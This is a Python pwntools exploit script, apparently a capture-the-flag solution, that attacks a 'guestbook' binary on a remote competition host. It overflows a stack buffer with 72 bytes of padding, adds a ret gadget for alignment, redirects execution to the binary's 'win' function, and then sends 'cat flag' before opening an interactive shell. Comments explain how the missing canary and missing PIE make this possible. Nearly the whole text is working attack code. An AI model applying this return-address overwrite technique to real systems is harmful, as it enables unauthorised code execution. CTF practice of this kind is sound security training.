#!/usr/bin/env python3
from pwn import *

# From checksec:
# Stack:      No canary found   =>  buffer overflow vulnerability is present
# PIE:        No PIE (0x400000) =>  addresses are static and can be used directly in the exploit

context.binary = elf = ELF('./guestbook', checksec=False)
OFFSET_TO_RIP = 72
ret_gadget = 0x40101a

p = remote("offsec.m0lecon.it", 13526)

p.recvuntil(b"name?\n")

payload = flat(
    b'A' * OFFSET_TO_RIP,   # padding to reach the RIP register that we want to overwrite
    p64(ret_gadget),        # align stack (16-Byte Rule) to avoid issues with the next instruction
    p64(elf.sym.win),       # or p64(win_addr) with win_addr = 0x40121b
)

p.send(payload)

p.sendline(b"cat flag")

p.interactive()
